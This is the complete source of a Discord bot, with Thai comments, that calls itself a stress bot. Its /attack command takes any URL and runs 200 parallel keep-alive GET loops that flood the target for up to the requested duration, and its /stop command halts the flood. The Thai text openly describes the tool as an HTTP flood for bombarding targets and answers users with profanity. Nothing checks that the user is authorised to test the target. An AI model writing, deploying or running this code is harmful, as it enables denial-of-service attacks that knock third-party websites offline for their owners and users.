/**
 * ============================================================================
 * JEFF FUJI - DISCORD STRESS BOT (v14)
 * Developed under JARVIS x ARI Protocol
 * ============================================================================
 */

const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const http = require('http');
const https = require('https');

// ดึง Token และ Client ID จาก Environment Variables ของ Railway
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// เก็บสถานะการยิง
let isAttacking = false;
let attackIntervals = [];

client.once('ready', async () => {
    console.log(`[+] Bot logged in as ${client.user.tag}`);

    // ลงทะเบียน Slash Command
    const commands = [
        new SlashCommandBuilder()
            .setName('attack')
            .setDescription('ส่ง HTTP Flood ถล่มเป้าหมาย')
            .addStringOption(option => 
                option.setName('url')
                    .setDescription('URL เป้าหมาย (เช่น http://example.com)')
                    .setRequired(true))
            .addIntegerOption(option => 
                option.setName('duration')
                    .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('stop')
            .setDescription('หยุดการยิงทั้งหมดทันที')
    ].map(command => command.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('[+] Started refreshing application (/) commands.');
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('[+] Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'attack') {
        const targetUrl = interaction.options.getString('url');
        const duration = interaction.options.getInteger('duration');

        if (isAttacking) {
            return interaction.reply({ content: '⚠️ กำลังมียุทธการยิงเป้าหมายอื่นอยู่ ใช้ /stop ก่อนไอ้สัส!', ephemeral: true });
        }

        try {
            const parsedUrl = new URL(targetUrl);
            const requester = parsedUrl.protocol === 'https:' ? https : http;

            isAttacking = true;
            await interaction.reply(`🔥 เริ่มระดมยิงเป้าหมาย **${targetUrl}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

            const startTime = Date.now();
            const endTime = startTime + (duration * 1000);

            // ฟังก์ชันยิงรัวๆ
            const fire = () => {
                if (!isAttacking || Date.now() >= endTime) return;

                const options = {
                    hostname: parsedUrl.hostname,
                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                    path: parsedUrl.pathname + parsedUrl.search,
                    method: 'GET',
                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
                    agent: new (parsedUrl.protocol === 'https:' ? https.Agent : http.Agent)({ keepAlive: true })
                };

                const req = requester.request(options, (res) => {
                    res.on('data', () => {});
                    res.on('end', () => { if (isAttacking) setImmediate(fire); });
                });

                req.on('error', () => { if (isAttacking) setImmediate(fire); });
                req.end();
            };

            // สร้าง Worker จำลองหลายๆ ชุดยิงพร้อมกัน
            for (let i = 0; i < 200; i++) {
                fire();
            }

            // ตั้งเวลาหยุดอัตโนมัติ
            const timer = setTimeout(() => {
                isAttacking = false;
                interaction.followUp(`✅ ภารกิจถล่ม **${targetUrl}** เสร็จสิ้นตามเวลาที่กำหนด!`).catch(() => {});
            }, duration * 1000);

            attackIntervals.push(timer);

        } catch (err) {
            isAttacking = false;
            return interaction.reply({ content: `❌ URL เหี้ยอะไรเนี่ย ผิดรูปแบบ: ${err.message}`, ephemeral: true });
        }

    } else if (commandName === 'stop') {
        if (!isAttacking) {
            return interaction.reply({ content: '💤 ไม่มีอะไรกำลังยิงอยู่ มึงจะให้หยุดอะไรไอ้สัส', ephemeral: true });
        }

        isAttacking = false;
        attackIntervals.forEach(t => clearTimeout(t));
        attackIntervals = [];

        await interaction.reply('🛑 สั่งหยุดการยิงทั้งหมดเรียบร้อย!');
    }
});

client.login(TOKEN);
